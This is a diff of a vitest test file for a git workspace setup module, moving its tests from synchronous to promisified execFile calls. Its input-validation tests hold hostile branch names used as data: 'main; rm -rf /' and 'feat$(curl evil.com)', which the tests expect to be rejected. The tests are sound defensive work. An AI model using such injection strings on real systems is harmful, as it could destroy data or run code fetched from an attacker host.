@@ -1,8 +1,9 @@
 // @ts-nocheck — test file, vitest uses esbuild transform
 import { describe, it, expect, vi, beforeEach } from 'vitest';
 
+// execFile 被 promisify 包裹：mock 必须调用末位回调，否则 await 永远挂起。
 vi.mock('node:child_process', () => ({
-  execFileSync: vi.fn(),
+  execFile: vi.fn(),
 }));
 
 vi.mock('node:fs', () => ({
@@ -42,7 +43,8 @@ vi.mock('../../utils/logger.js', () => ({
   },
 }));
 
-// Mock cache module
+// Mock cache module — ensureBareCache 现在是 async，但 mock 返回普通对象即可
+// （setupWorkspace 内 await 会自动解包非 Promise 值）。
 const mockEnsureBareCache = vi.fn(() => ({ cachePath: '/repos/cache/github.com/user/repo.git' }));
 const mockSanitizeRepoUrl = vi.fn((url: string) => url);
 vi.mock('../cache.js', () => ({
@@ -50,13 +52,28 @@ vi.mock('../cache.js', () => ({
   sanitizeRepoUrl: (...args: unknown[]) => mockSanitizeRepoUrl(...args),
 }));
 
-import { execFileSync } from 'node:child_process';
+import { execFile } from 'node:child_process';
 import { existsSync, mkdirSync } from 'node:fs';
 import { deriveRepoName, setupWorkspace } from '../manager.js';
 
-const mockExecFileSync = vi.mocked(execFileSync);
+const mockExecFile = vi.mocked(execFile);
 const mockExistsSync = vi.mocked(existsSync);
 const mockMkdirSync = vi.mocked(mkdirSync);
+
+/** promisify(execFile) 兼容：调用末位回调表示子进程成功退出 */
+function execFileOk(...args: unknown[]) {
+  const cb = args[args.length - 1];
+  if (typeof cb === 'function') (cb as (e: unknown, r: unknown) => void)(null, { stdout: '', stderr: '' });
+  return undefined as never;
+}
+/** promisify(execFile) 兼容：以错误回调（即子进程失败 / 超时） */
+function execFileErr(message: string) {
+  return (...args: unknown[]) => {
+    const cb = args[args.length - 1];
+    if (typeof cb === 'function') (cb as (e: unknown) => void)(new Error(message));
+    return undefined as never;
+  };
+}
 
 beforeEach(() => {
   vi.clearAllMocks();
@@ -67,6 +84,10 @@ beforeEach(() => {
   });
   mockEnsureBareCache.mockReturnValue({ cachePath: '/repos/cache/github.com/user/repo.git' });
   mockSanitizeRepoUrl.mockImplementation((url) => url);
+  // 默认 execFile 全部成功；失败用例用 mockImplementationOnce 覆盖。
+  // mockReset 清掉上一个用例残留的 once 实现，避免泄漏。
+  mockExecFile.mockReset();
+  mockExecFile.mockImplementation(execFileOk);
 });
 
 // ============================================================
@@ -112,13 +133,13 @@ describe('deriveRepoName', () => {
 // ============================================================
 
 describe('setupWorkspace', () => {
-  it('should throw when neither repoUrl nor localPath is provided', () => {
-    expect(() => setupWorkspace({})).toThrow('必须提供 repo_url 或 local_path');
+  it('should throw when neither repoUrl nor localPath is provided', async () => {
+    await expect(setupWorkspace({})).rejects.toThrow('必须提供 repo_url 或 local_path');
   });
 
   describe('writable mode (default)', () => {
-    it('should use bare cache for remote repo and create feature branch', () => {
-      const result = setupWorkspace({ repoUrl: 'https://github.com/user/repo.git' });
+    it('should use bare cache for remote repo and create feature branch', async () => {
+      const result = await setupWorkspace({ repoUrl: 'https://github.com/user/repo.git' });
 
       expect(result.repoName).toBe('repo');
       expect(result.branch).toMatch(/^feat\/claude-session-/);
@@ -127,37 +148,37 @@ describe('setupWorkspace', () => {
       expect(mockEnsureBareCache).toHaveBeenCalledWith('https://github.com/user/repo.git');
 
       // Should call git clone (from cache) and git checkout -b
-      expect(mockExecFileSync).toHaveBeenCalledTimes(3); // clone + set-url + checkout
+      expect(mockExecFile).toHaveBeenCalledTimes(3); // clone + set-url + checkout
 
-      const cloneCall = mockExecFileSync.mock.calls[0];
+      const cloneCall = mockExecFile.mock.calls[0];
       expect(cloneCall[0]).toBe('git');
       expect(cloneCall[1]).toContain('clone');
       // Clone source should be the cache path
       expect(cloneCall[1]).toContain('/repos/cache/github.com/user/repo.git');
 
       // set-url call
-      const setUrlCall = mockExecFileSync.mock.calls[1];
+      const setUrlCall = mockExecFile.mock.calls[1];
       expect(setUrlCall[1]).toContain('set-url');
 
       // checkout call
-      const checkoutCall = mockExecFileSync.mock.calls[2];
+      const checkoutCall = mockExecFile.mock.calls[2];
       expect(checkoutCall[1][0]).toBe('checkout');
       expect(checkoutCall[1][1]).toBe('-b');
     });
 
-    it('should sanitize remote URL when setting origin', () => {
+    it('should sanitize remote URL when setting origin', async () => {
       mockSanitizeRepoUrl.mockReturnValue('https://github.com/user/repo.git');
 
-      setupWorkspace({ repoUrl: 'https://token:x@github.com/user/repo.git' });
+      await setupWorkspace({ repoUrl: 'https://token:x@github.com/user/repo.git' });
 
       expect(mockSanitizeRepoUrl).toHaveBeenCalledWith('https://token:x@github.com/user/repo.git');
 
-      const setUrlCall = mockExecFileSync.mock.calls[1];
+      const setUrlCall = mockExecFile.mock.calls[1];
       expect(setUrlCall[1]).toContain('https://github.com/user/repo.git');
     });
 
-    it('should use custom featureBranch when specified', () => {
-      const result = setupWorkspace({
+    it('should use custom featureBranch when specified', async () => {
+      const result = await setupWorkspace({
         repoUrl: 'https://github.com/user/repo',
         featureBranch: 'fix/my-bug',
       });
@@ -167,8 +188,8 @@ describe('setupWorkspace', () => {
   });
 
   describe('readonly mode', () => {
-    it('should clone from cache without creating feature branch', () => {
-      const result = setupWorkspace({
+    it('should clone from cache without creating feature branch', async () => {
+      const result = await setupWorkspace({
         repoUrl: 'https://github.com/user/repo.git',
         mode: 'readonly',
       });
@@ -179,25 +200,25 @@ describe('setupWorkspace', () => {
       expect(mockEnsureBareCache).toHaveBeenCalled();
 
       // Should only call git clone (no set-url, no checkout -b)
-      expect(mockExecFileSync).toHaveBeenCalledTimes(1);
-      const cloneCall = mockExecFileSync.mock.calls[0];
+      expect(mockExecFile).toHaveBeenCalledTimes(1);
+      const cloneCall = mockExecFile.mock.calls[0];
       expect(cloneCall[1]).toContain('clone');
     });
 
-    it('should checkout source_branch if specified', () => {
-      setupWorkspace({
+    it('should checkout source_branch if specified', async () => {
+      await setupWorkspace({
         repoUrl: 'https://github.com/user/repo.git',
         mode: 'readonly',
         sourceBranch: 'develop',
       });
 
-      const cloneArgs = mockExecFileSync.mock.calls[0][1];
+      const cloneArgs = mockExecFile.mock.calls[0][1];
       expect(cloneArgs).toContain('--branch');
       expect(cloneArgs).toContain('develop');
     });
 
-    it('should include "readonly" in workspace dir name', () => {
-      const result = setupWorkspace({
+    it('should include "readonly" in workspace dir name', async () => {
+      const result = await setupWorkspace({
         repoUrl: 'https://github.com/user/repo.git',
         mode: 'readonly',
       });
@@ -207,7 +228,7 @@ describe('setupWorkspace', () => {
   });
 
   describe('localPath (no cache)', () => {
-    it('should clone directly from localPath without using cache', () => {
+    it('should clone directly from localPath without using cache', async () => {
       mockExistsSync.mockImplementation((p) => {
         if (p === '/tmp/workspaces') return true;
         if (p === '/home/user/projects/my-app') return true;
@@ -215,22 +236,22 @@ describe('setupWorkspace', () => {
         return false;
       });
 
-      const result = setupWorkspace({ localPath: '/home/user/projects/my-app' });
+      const result = await setupWorkspace({ localPath: '/home/user/projects/my-app' });
 
       expect(result.repoName).toBe('my-app');
       // Should NOT call ensureBareCache
       expect(mockEnsureBareCache).not.toHaveBeenCalled();
 
       // Clone source should be the local path
-      const cloneArgs = mockExecFileSync.mock.calls[0][1];
+      const cloneArgs = mockExecFile.mock.calls[0][1];
       expect(cloneArgs).toContain('/home/user/projects/my-app');
     });
   });
 
-  it('should include git security parameters in clone args (local clone from cache)', () => {
-    setupWorkspace({ repoUrl: 'https://github.com/user/repo.git' });
+  it('should include git security parameters in clone args (local clone from cache)', async () => {
+    await setupWorkspace({ repoUrl: 'https://github.com/user/repo.git' });
 
-    const cloneArgs = mockExecFileSync.mock.calls[0][1];
+    const cloneArgs = mockExecFile.mock.calls[0][1];
     // 从 bare cache 本地 clone 时使用 LOCAL 安全参数（不含 protocol.file.allow=never）
     expect(cloneArgs).toContain('--config');
     expect(cloneArgs[cloneArgs.indexOf('--config') + 1]).toBe('core.hooksPath=/dev/null');
@@ -239,52 +260,48 @@ describe('setupWorkspace', () => {
     expect(cloneArgs).not.toContain('protocol.file.allow=never');
   });
 
-  it('should pass --branch when sourceBranch is specified', () => {
-    setupWorkspace({ repoUrl: 'https://github.com/user/repo', sourceBranch: 'develop' });
+  it('should pass --branch when sourceBranch is specified', async () => {
+    await setupWorkspace({ repoUrl: 'https://github.com/user/repo', sourceBranch: 'develop' });
 
-    const cloneCall = mockExecFileSync.mock.calls[0];
+    const cloneCall = mockExecFile.mock.calls[0];
     const args = cloneCall[1];
     const branchIdx = args.indexOf('--branch');
     expect(branchIdx).toBeGreaterThan(-1);
     expect(args[branchIdx + 1]).toBe('develop');
   });
 
-  it('should create baseDir if it does not exist', () => {
+  it('should create baseDir if it does not exist', async () => {
     mockExistsSync.mockReturnValue(false);
 
-    setupWorkspace({ repoUrl: 'https://github.com/user/repo' });
+    await setupWorkspace({ repoUrl: 'https://github.com/user/repo' });
 
     expect(mockMkdirSync).toHaveBeenCalledWith('/tmp/workspaces', { recursive: true });
   });
 
-  it('should set GIT_LFS_SKIP_SMUDGE=1 to avoid LFS smudge failures from bare cache', () => {
-    setupWorkspace({ repoUrl: 'https://github.com/user/repo.git' });
+  it('should set GIT_LFS_SKIP_SMUDGE=1 to avoid LFS smudge failures from bare cache', async () => {
+    await setupWorkspace({ repoUrl: 'https://github.com/user/repo.git' });
 
-    const cloneCall = mockExecFileSync.mock.calls[0];
+    const cloneCall = mockExecFile.mock.calls[0];
     const cloneOpts = cloneCall[2] as { env?: Record<string, string> };
     expect(cloneOpts.env).toBeDefined();
     expect(cloneOpts.env!.GIT_LFS_SKIP_SMUDGE).toBe('1');
   });
 
-  it('should wrap git clone errors', () => {
-    mockExecFileSync.mockImplementationOnce(() => {
-      throw new Error('fatal: repository not found');
-    });
+  it('should wrap git clone errors', async () => {
+    mockExecFile.mockImplementationOnce(execFileErr('fatal: repository not found'));
 
-    expect(() => setupWorkspace({ repoUrl: 'https://github.com/user/no-exist' }))
-      .toThrow('git clone 失败: fatal: repository not found');
+    await expect(setupWorkspace({ repoUrl: 'https://github.com/user/no-exist' }))
+      .rejects.toThrow('git clone 失败: fatal: repository not found');
   });
 
-  it('should wrap git checkout errors (writable mode)', () => {
-    mockExecFileSync
-      .mockImplementationOnce(() => '') // clone
-      .mockImplementationOnce(() => '') // set-url
-      .mockImplementationOnce(() => {   // checkout
-        throw new Error('fatal: branch already exists');
-      });
+  it('should wrap git checkout errors (writable mode)', async () => {
+    mockExecFile
+      .mockImplementationOnce(execFileOk)                              // clone
+      .mockImplementationOnce(execFileOk)                              // set-url
+      .mockImplementationOnce(execFileErr('fatal: branch already exists')); // checkout
 
-    expect(() => setupWorkspace({ repoUrl: 'https://github.com/user/repo' }))
-      .toThrow('创建分支失败: fatal: branch already exists');
+    await expect(setupWorkspace({ repoUrl: 'https://github.com/user/repo' }))
+      .rejects.toThrow('创建分支失败: fatal: branch already exists');
   });
 
   // ============================================================
@@ -292,61 +309,61 @@ describe('setupWorkspace', () => {
   // ============================================================
 
   describe('input validation', () => {
-    it('should reject repoUrl without valid protocol', () => {
-      expect(() => setupWorkspace({ repoUrl: 'not-a-url' }))
-        .toThrow('无效的仓库 URL: not-a-url');
+    it('should reject repoUrl without valid protocol', async () => {
+      await expect(setupWorkspace({ repoUrl: 'not-a-url' }))
+        .rejects.toThrow('无效的仓库 URL: not-a-url');
     });
 
-    it('should accept HTTPS URL', () => {
-      expect(() => setupWorkspace({ repoUrl: 'https://github.com/user/repo' }))
-        .not.toThrow();
+    it('should accept HTTPS URL', async () => {
+      await expect(setupWorkspace({ repoUrl: 'https://github.com/user/repo' }))
+        .resolves.toBeDefined();
     });
 
-    it('should accept SSH URL', () => {
-      expect(() => setupWorkspace({ repoUrl: 'git@github.com:user/repo.git' }))
-        .not.toThrow();
+    it('should accept SSH URL', async () => {
+      await expect(setupWorkspace({ repoUrl: 'git@github.com:user/repo.git' }))
+        .resolves.toBeDefined();
     });
 
-    it('should accept ssh:// URL', () => {
-      expect(() => setupWorkspace({ repoUrl: 'ssh://git@github.com/user/repo' }))
-        .not.toThrow();
+    it('should accept ssh:// URL', async () => {
+      await expect(setupWorkspace({ repoUrl: 'ssh://git@github.com/user/repo' }))
+        .resolves.toBeDefined();
     });
 
-    it('should accept git:// URL', () => {
-      expect(() => setupWorkspace({ repoUrl: 'git://github.com/user/repo' }))
-        .not.toThrow();
+    it('should accept git:// URL', async () => {
+      await expect(setupWorkspace({ repoUrl: 'git://github.com/user/repo' }))
+        .resolves.toBeDefined();
     });
 
-    it('should reject localPath that does not exist', () => {
+    it('should reject localPath that does not exist', async () => {
       mockExistsSync.mockImplementation((p) => {
         if (p === '/tmp/workspaces') return true;
         return false;
       });
 
-      expect(() => setupWorkspace({ localPath: '/nonexistent/path' }))
-        .toThrow('本地路径不存在: /nonexistent/path');
+      await expect(setupWorkspace({ localPath: '/nonexistent/path' }))
+        .rejects.toThrow('本地路径不存在: /nonexistent/path');
     });
 
-    it('should reject sourceBranch with shell metacharacters', () => {
-      expect(() => setupWorkspace({
+    it('should reject sourceBranch with shell metacharacters', async () => {
+      await expect(setupWorkspace({
         repoUrl: 'https://github.com/user/repo',
         sourceBranch: 'main; rm -rf /',
-      })).toThrow('无效的分支名: main; rm -rf /');
+      })).rejects.toThrow('无效的分支名: main; rm -rf /');
     });
 
-    it('should reject featureBranch with shell metacharacters', () => {
-      expect(() => setupWorkspace({
+    it('should reject featureBranch with shell metacharacters', async () => {
+      await expect(setupWorkspace({
         repoUrl: 'https://github.com/user/repo',
         featureBranch: 'feat$(curl evil.com)',
-      })).toThrow('无效的分支名');
+      })).rejects.toThrow('无效的分支名');
     });
 
-    it('should accept valid branch names with slashes, dots, dashes', () => {
-      expect(() => setupWorkspace({
+    it('should accept valid branch names with slashes, dots, dashes', async () => {
+      await expect(setupWorkspace({
         repoUrl: 'https://github.com/user/repo',
         sourceBranch: 'release/v1.2.3',
         featureBranch: 'feat/my-feature_v2',
-      })).not.toThrow();
+      })).resolves.toBeDefined();
     });
   });
 
